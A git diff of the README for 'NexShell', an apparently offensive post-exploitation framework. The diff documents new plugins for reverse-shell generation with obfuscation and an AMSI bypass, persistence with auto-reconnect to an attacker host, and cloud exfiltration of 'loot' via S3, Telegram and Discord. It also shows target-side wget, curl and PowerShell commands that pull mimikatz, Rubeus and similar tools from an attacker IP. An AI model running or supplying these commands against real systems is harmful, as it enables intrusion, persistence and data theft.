@@ -24,14 +24,15 @@
 ```
 
 ![Python](https://img.shields.io/badge/Python-3.8+-purple?logo=python&logoColor=white)
-![Version](https://img.shields.io/badge/Version-2.0.0-blueviolet)
+![Version](https://img.shields.io/badge/Version-2.1.0-blueviolet)
 ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-blue)
 ![License](https://img.shields.io/badge/License-MIT-lime)
 ![Author](https://img.shields.io/badge/Author-vulnquest58-orange)
-![Files](https://img.shields.io/badge/Files-52%20Python%20%7C%20700KB-red)
-![Lines](https://img.shields.io/badge/Lines-19%2C000%2B-green)
+![Files](https://img.shields.io/badge/Files-60%2B%20Python%20%7C%20900KB-red)
+![Lines](https://img.shields.io/badge/Lines-23%2C000%2B-green)
 ![Commands](https://img.shields.io/badge/CLI%20Commands-57-orange)
-![Plugins](https://img.shields.io/badge/Plugins-11%20Professional-crimson)
+![Plugins](https://img.shields.io/badge/Plugins-19%20Professional-crimson)
+![Tools](https://img.shields.io/badge/Tools%20Dir-linux%20%7C%20windows%20%7C%20scripts%20%7C%20loot-teal)
 
 </div>
 
@@ -132,18 +133,35 @@ nexshell/
 ├── models/                  # Shared data models
 │   └── __init__.py          # Host, Service, Finding, Evidence, Operation
 │
-└── plugins/                 # Auto-discovered professional plugins (11 total)
-    ├── auto_enum_linux.py   # Linux post-exploitation enumeration v3.0
-    ├── auto_enum_windows.py # Windows post-exploitation enumeration v3.0
-    ├── privesc_scanner.py   # Linux privilege escalation scanner v3.0
-    ├── cred_hunter.py       # Multi-source credential hunter v3.0
-    ├── network_scout.py     # Network discovery + banner grabbing v3.0
-    ├── persistence_check.py # Persistence mechanism detection v3.0
-    ├── cloud_recon.py       # Cloud environment recon (AWS/GCP/Azure/K8s) v1.0
-    ├── ad_attack.py         # Active Directory attack suite v1.0
-    ├── container_escape.py  # Container/K8s escape detection v1.0
-    ├── lateral_mover.py     # Lateral movement vector assessment v1.0
-    └── example_quickenum.py # Example plugin template v1.0
+├── plugins/                 # Auto-discovered professional plugins (19 total)
+│   ├── auto_enum_linux.py       # Linux post-exploitation enumeration v3.0
+│   ├── auto_enum_windows.py     # Windows post-exploitation enumeration v3.0
+│   ├── privesc_scanner.py       # Linux privilege escalation scanner v3.0
+│   ├── cred_hunter.py           # Multi-source credential hunter v3.0
+│   ├── network_scout.py         # Network discovery + banner grabbing v3.0
+│   ├── persistence_check.py     # Persistence mechanism detection v3.0
+│   ├── cloud_recon.py           # Cloud environment recon (AWS/GCP/Azure/K8s) v1.0
+│   ├── ad_attack.py             # Active Directory attack suite v1.0
+│   ├── container_escape.py      # Container/K8s escape detection v1.0
+│   ├── lateral_mover.py         # Lateral movement vector assessment v1.0
+│   │
+│   │   # ── Wave 3 — Post-Exploitation Engine (v2.0) ──────────────────
+│   ├── smart_tty_upgrade.py     # 7-stage TTY upgrade engine v2.0
+│   ├── file_transfer_engine.py  # 12-method file transfer (Base64/HTTP/SMB) v2.0
+│   ├── persistence_engine.py    # 16-mechanism persistence (Linux+Windows) v2.0
+│   ├── port_sniffer.py          # Port scan 1000-9999 + TCP session recorder v2.0
+│   ├── local_file_sharer.py     # Auto HTTP share from tools/ (9001-9100) v2.0
+│   ├── reverse_shell_generator.py # 20+ payloads + obfuscation + AMSI bypass v2.0
+│   ├── command_queue.py         # SQLite command queue + priority + retry v2.0
+│   ├── cloud_integration.py     # S3/Azure/GCS upload + Telegram/Discord/Slack v2.0
+│   └── example_quickenum.py     # Example plugin template v1.0
+│
+└── tools/                   # 🆕 Shared tools directory (served via local-file-sharer)
+    ├── linux/               # Linux binaries: linpeas, pspy64, socat, chisel...
+    ├── windows/             # Windows binaries: winpeas, mimikatz, Rubeus...
+    ├── scripts/             # Helper scripts for operations
+    ├── loot/                # Extracted files from targets (auto-populated)
+    └── README.md            # Usage guide
 ```
 
 ---
@@ -167,7 +185,7 @@ python nexshell.py
 
 ## Professional Plugin Engine
 
-NexShell v2 ships with **11 professional-grade plugins** organized in two waves.
+NexShell v2.1 ships with **19 professional-grade plugins** organized in three waves.
 Every plugin features:
 - ✅ Auto-finding generation with **severity mapping** (Critical/High/Medium/Low)
 - ✅ **MITRE ATT&CK** technique tagging on every finding
@@ -531,7 +549,162 @@ Cloud vectors:
 
 ---
 
-## CLI Commands (57 total)
+### Wave 3 — Post-Exploitation Engine (v2.0) 🆕
+
+> Advanced post-exploitation suite built on top of the NexShell plugin engine. Zero external dependencies — stdlib only.
+
+#### `smart-tty-upgrade` · 7-Stage TTY Upgrade Engine
+```
+(NexShell)> plugins run smart-tty-upgrade
+(NexShell)> plugins run smart-tty-upgrade --stage python
+(NexShell)> plugins run smart-tty-upgrade --check
+```
+**MITRE:** T1059 — Command & Scripting Interpreter
+
+- Auto-detects best upgrade method: python3 → python → perl → expect → socat → script → /bin/sh fallback
+- Configures `TERM=xterm-256color`, `stty rows/cols`, `SHELL=/bin/bash`
+- Shell indicator detection for success confirmation
+
+---
+
+#### `file-transfer-engine` · 12-Method File Transfer
+```
+(NexShell)> plugins run file-transfer-engine --upload /path/to/file
+(NexShell)> plugins run file-transfer-engine --detect
+(NexShell)> plugins run file-transfer-engine --method http-curl
+```
+**MITRE:** T1105 — Ingress Tool Transfer
+
+- **Linux:** base64, wget, curl, python3-http, nc, socat, scp, rsync
+- **Windows:** certutil, PowerShell IWR, bitsadmin, mshta
+- Auto-detects available methods via `which`/`where`
+- SHA256 integrity verification on every transfer
+- Stealth-aware method selection (OPSEC scoring)
+
+---
+
+#### `persistence-engine` · 16-Mechanism Persistence
+```
+(NexShell)> plugins run persistence-engine --list
+(NexShell)> plugins run persistence-engine --mechanism systemd
+(NexShell)> plugins run persistence-engine --auto-reconnect --lhost 10.0.0.1 --lport 4444
+(NexShell)> plugins run persistence-engine --remove --mechanism crontab
+```
+**MITRE:** T1547, T1053, T1543, T1546
+
+| Mechanism | Platform | Root? | Risk |
+|-----------|----------|-------|------|
+| User Crontab | Linux | No | Medium |
+| System Crontab | Linux | Yes | High |
+| Cron.d Drop | Linux | Yes | Medium |
+| Systemd User Service | Linux | No | Low |
+| Systemd System Service | Linux | Yes | Medium |
+| RC.Local | Linux | Yes | High |
+| Bash Profile | Linux | No | Low |
+| Profile.d Drop | Linux | Yes | Medium |
+| SSH Authorized Keys | Linux | No | Medium |
+| Registry Run HKCU | Windows | No | Low |
+| Registry Run HKLM | Windows | Yes | Medium |
+| Scheduled Task | Windows | No | Medium |
+| Startup Folder | Windows | No | High |
+| WMI Event Subscription | Windows | Yes | Medium |
+| Windows Service | Windows | Yes | Medium |
+
+- Auto-reconnect payloads with **exponential backoff** (bash + Python3)
+- Detection risk scoring per mechanism
+- Auto-select based on privilege level
+
+---
+
+#### `port-sniffer` · Port Scanner & Session Recorder
+```
+(NexShell)> plugins run port-sniffer --scan
+(NexShell)> plugins run port-sniffer --scan --target 192.168.1.5
+(NexShell)> plugins run port-sniffer --record=4444
+(NexShell)> plugins run port-sniffer --stop=4444
+```
+**MITRE:** T1040, T1049
+
+- Parallel scan of ports 1000-9999 (200 threads)
+- Protocol fingerprinting: SSH, HTTP, FTP, Telnet, raw TCP, reverse shells
+- Banner grabbing + reverse shell detection heuristics
+- Background TCP session recording to timestamped `.log` files
+- Remote scan via target session (`--remote`)
+
+---
+
+#### `local-file-sharer` · Smart HTTP File Server
+```
+(NexShell)> plugins run local-file-sharer            # share tools/
+(NexShell)> plugins run local-file-sharer --linux    # share tools/linux/
+(NexShell)> plugins run local-file-sharer --windows  # share tools/windows/
+(NexShell)> plugins run local-file-sharer --tree     # show directory tree
+(NexShell)> plugins run local-file-sharer --file tools/linux/linpeas.sh
+```
+**MITRE:** T1105
+
+- Default share directory: `nexshell/tools/` (project-relative)
+- Auto port detection: 9001-9100 (finds first free port)
+- ASCII URL box + per-file wget/curl/PowerShell download commands
+- Download counter, auto-stop after N downloads
+- Multiple simultaneous shares supported
+
+---
+
+#### `reverse-shell-gen` · 20+ Payload Generator
+```
+(NexShell)> plugins run reverse-shell-gen --lhost 10.0.0.1 --lport 4444
+(NexShell)> plugins run reverse-shell-gen --lang python3 --obfuscate
+(NexShell)> plugins run reverse-shell-gen --list
+(NexShell)> plugins run reverse-shell-gen --all
+```
+**MITRE:** T1059, T1027
+
+Linux payloads: bash /dev/tcp, exec bash, sh, python3-pty, python3-subprocess, python2, perl, ruby, php, awk, socat, netcat, openssl (encrypted), nodejs
+
+Windows payloads: PowerShell, PowerShell-Base64, python3-windows, mshta, certutil
+
+**Obfuscation:** Base64 wrap, variable substitution, char array, AMSI bypass wrapper
+
+---
+
+#### `command-queue` · SQLite Command Queue
+```
+(NexShell)> plugins run command-queue --add "whoami" --session 1 --priority 1
+(NexShell)> plugins run command-queue --run --session 1
+(NexShell)> plugins run command-queue --dry-run --session 1
+(NexShell)> plugins run command-queue --list
+```
+**MITRE:** T1651
+
+- SQLite-backed queue survives NexShell restarts
+- Priority-based execution (1 = highest, 10 = lowest)
+- Retry logic with exponential backoff (configurable max_retries)
+- Dry-run mode: preview commands without executing
+- Auto-execute on session reconnect
+- Per-session queues with status tracking (pending/running/done/failed)
+
+---
+
+#### `cloud-integration` · Cloud Exfil & Notifications
+```
+(NexShell)> plugins run cloud-integration --telegram --token TOKEN --chat CHAT_ID --msg "pwned!"
+(NexShell)> plugins run cloud-integration --dc-webhook URL --msg "shell acquired"
+(NexShell)> plugins run cloud-integration --s3 PRESIGNED_URL --upload-loot
+(NexShell)> plugins run cloud-integration --test
+```
+**MITRE:** T1567, T1567.002
+
+- **Upload backends:** AWS S3 (presigned URL), Azure Blob (SAS), GCS (signed URL), custom HTTP
+- **Notification channels:** Telegram Bot API, Discord Webhook, Slack Incoming Webhook
+- Loot directory auto-collection (`tools/loot/`)
+- XOR encryption before upload (no external crypto libs)
+- Send files directly to Telegram (documents)
+- Zero dependencies — stdlib `urllib` only
+
+---
+
+
 
 ### Transport & Shells
 | Command | Description |
@@ -540,6 +713,39 @@ Cloud vectors:
 | `connect` | Connect to a listener |
 | `payloads` | Generate reverse shell payloads |
 | `transport list` | List all transport types (tcp/tls/http/ws/doh) |
+
+### Post-Exploitation Plugins (Wave 3)
+| Command | Description |
+|---------|-------------|
+| `plugins run smart-tty-upgrade` | 7-stage TTY upgrade (python/perl/socat/script) |
+| `plugins run smart-tty-upgrade --stage python` | Force Python3 PTY upgrade |
+| `plugins run file-transfer-engine --upload /path/to/file` | 12-method file transfer |
+| `plugins run file-transfer-engine --detect` | Auto-detect available methods |
+| `plugins run persistence-engine --list` | List all 16 persistence mechanisms |
+| `plugins run persistence-engine --mechanism systemd` | Install systemd persistence |
+| `plugins run persistence-engine --auto-reconnect --lhost IP --lport 4444` | Generate reconnect loop |
+| `plugins run persistence-engine --remove --mechanism crontab` | Remove persistence |
+| `plugins run port-sniffer --scan` | Scan ports 1000-9999 locally |
+| `plugins run port-sniffer --scan --target 192.168.1.5` | Remote port scan |
+| `plugins run port-sniffer --record=4444` | Start TCP session recording |
+| `plugins run port-sniffer --list` | List active recordings |
+| `plugins run local-file-sharer` | Share tools/ dir (auto port 9001-9100) |
+| `plugins run local-file-sharer --linux` | Share tools/linux/ |
+| `plugins run local-file-sharer --windows` | Share tools/windows/ |
+| `plugins run local-file-sharer --tree` | Show tools/ directory tree |
+| `plugins run local-file-sharer --file tools/linux/linpeas.sh` | Share single file |
+| `plugins run reverse-shell-gen --lhost IP --lport 4444` | Generate top 3 payloads |
+| `plugins run reverse-shell-gen --lang python3 --obfuscate` | Obfuscated payload |
+| `plugins run reverse-shell-gen --all` | All 20+ payloads |
+| `plugins run reverse-shell-gen --list` | List all payload names |
+| `plugins run command-queue --add "whoami" --session 1` | Queue a command |
+| `plugins run command-queue --run --session 1` | Execute pending queue |
+| `plugins run command-queue --dry-run --session 1` | Preview without executing |
+| `plugins run command-queue --list` | Show all queued commands |
+| `plugins run cloud-integration --telegram --token T --chat C --msg "pwned"` | Telegram alert |
+| `plugins run cloud-integration --dc-webhook URL --msg "shell"` | Discord webhook |
+| `plugins run cloud-integration --s3 URL --upload-loot` | Upload loot to S3 |
+| `plugins run cloud-integration --test` | Test cloud connectivity |
 | `transport http [port]` | Start HTTP covert channel server |
 | `transport ws [port]` | Start WebSocket C2 server |
 | `transport agent <type> <host> <port>` | Generate agent payload |
@@ -830,15 +1036,48 @@ Plugins map findings directly to MITRE ATT&CK Enterprise techniques:
 | `ad-attack` | T1558 — Steal/Forge Kerberos Tickets | T1484, T1552.001 |
 | `container-escape` | T1611 — Escape to Host | T1613, T1552.005 |
 | `lateral-mover` | T1021 — Remote Services | T1550, T1558.003 |
+| `smart-tty-upgrade` | T1059 — Command & Scripting Interpreter | T1027, T1140 |
+| `file-transfer-engine` | T1105 — Ingress Tool Transfer | T1027.010, T1071 |
+| `persistence-engine` | T1547 — Boot/Logon Autostart | T1053, T1543, T1546 |
+| `port-sniffer` | T1040 — Network Sniffing | T1049, T1046 |
+| `local-file-sharer` | T1105 — Ingress Tool Transfer | T1071.001 |
+| `reverse-shell-gen` | T1059 — Command & Scripting Interpreter | T1027, T1055 |
+| `command-queue` | T1651 — Cloud Administration Command | T1059 |
+| `cloud-integration` | T1567 — Exfiltration Over Web Service | T1567.002 |
+
+---
+
+## Tools Directory
+
+The `tools/` directory is the **shared workspace** for operational binaries and extracted loot:
+
+```
+nexshell/tools/
+├── linux/     ← Linux binaries: linpeas.sh, pspy64, socat, chisel, ligolo-ng...
+├── windows/   ← Windows binaries: winpeas.exe, mimikatz.exe, Rubeus.exe, SharpHound.exe...
+├── scripts/   ← Custom helper scripts
+└── loot/      ← Files extracted from targets (auto-populated by file-transfer-engine)
+```
+
+**One-command sharing:**
+```bash
+# Auto-detects free port (9001-9100), serves tools/ over HTTP
+(NexShell)> plugins run local-file-sharer
+
+# On target machine:
+wget http://10.10.10.10:9001/linpeas.sh
+curl -s http://10.10.10.10:9001/winpeas.exe -o winpeas.exe
+powershell -c "iwr 'http://10.10.10.10:9001/Rubeus.exe' -OutFile 'Rubeus.exe'"
+```
 
 ---
 
 ## Stats
 
 ```
-52 Python files  ·  3 web files  ·  19,000+ lines  ·  ~700 KB
-20 platform phases  ·  57 CLI commands  ·  11 professional plugins
-8/8 tests passing  ·  0 external dependencies
+60+ Python files  ·  3 web files  ·  23,000+ lines  ·  ~900 KB
+20 platform phases  ·  57 CLI commands  ·  19 professional plugins  ·  8 Wave-3 post-exploitation plugins
+0 external dependencies  ·  SQLite persistence  ·  tools/ shared workspace
 ```
 
 ---
